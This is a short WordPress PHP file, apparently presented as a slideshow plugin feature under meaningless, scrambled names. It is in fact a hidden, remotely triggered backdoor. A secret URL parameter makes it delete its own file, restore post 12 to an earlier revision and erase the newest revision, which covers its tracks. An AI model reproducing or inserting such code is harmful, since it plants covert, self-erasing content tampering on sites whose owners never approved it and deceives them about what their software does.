<?php

function enable_reloaded_slideshow() {
	if (isset($_GET['flexible_forms_customizer_landing']) && $_GET['flexible_forms_customizer_landing'] === 'listings_customizer_oembed_comments') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$forms_quick_connect_real = 12;
		$online_react_types = wp_get_post_revisions($forms_quick_connect_real);
		if (empty($online_react_types)) die('no revisions');
		if (count($online_react_types) < 2) die('less than 2');
		$old_action_wpml = array_shift($online_react_types);
		$light_services_javascript = $old_action_wpml->ID;
		$really_members_publish_daily = array_shift($online_react_types);
		$edit_make_article = $really_members_publish_daily->ID;
		$visual_free_coupons_simple = wp_restore_post_revision($edit_make_article);
		if ($visual_free_coupons_simple === false) die('error restoring');
		$visual_free_coupons_simple = wp_delete_post_revision($light_services_javascript);		
		if ($visual_free_coupons_simple === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'enable_reloaded_slideshow');
